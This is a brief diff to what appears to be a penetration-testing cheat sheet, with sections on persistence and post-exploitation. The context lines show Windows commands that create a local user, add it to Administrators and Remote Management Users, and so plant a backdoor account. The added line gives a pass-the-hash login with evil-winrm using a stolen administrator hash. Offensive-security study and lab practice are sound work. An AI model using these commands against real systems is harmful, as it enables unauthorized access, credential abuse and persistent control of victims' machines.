@@ -118,7 +118,8 @@ ____
  # Persistence
      net user USERNAME PASSWORD /add
      net localgroup Administrators USERNAME /add
-     net localgroup "Remote Management Users" USERNAME /add
+     net localgroup "Remote Management Users" USERNAME /add  
+     pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP
  ____ 
  # Post Exploitation  
  ## Mimikatz
